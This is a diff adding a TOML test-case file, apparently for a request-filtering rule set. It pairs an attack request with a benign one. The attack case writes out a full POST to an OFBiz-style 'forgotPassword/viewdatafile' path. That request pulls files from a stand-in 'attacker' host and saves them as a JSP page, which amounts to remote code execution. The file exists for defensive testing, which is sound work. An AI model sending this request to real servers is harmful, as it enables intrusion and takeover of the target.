@@ -1,0 +1,35 @@
+[[case]]
+name = "remote-import-into-jsp"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/webtools/control/forgotPassword/viewdatafile"
+query = "DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "block"
+rule = "request_remote_import_script_write"
+
+[case.backport]
+effect = "unreachable"
+why = "the backports have no request-entry rule for this input"
+
+[[case]]
+name = "benign-local-import-into-jsp"
+kind = "benign"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/webtools/control/viewdatafile"
+query = "DATAFILE_LOCATION=./runtime/import/report.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=false"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "none"
+
+[case.backport]
+effect = "none"
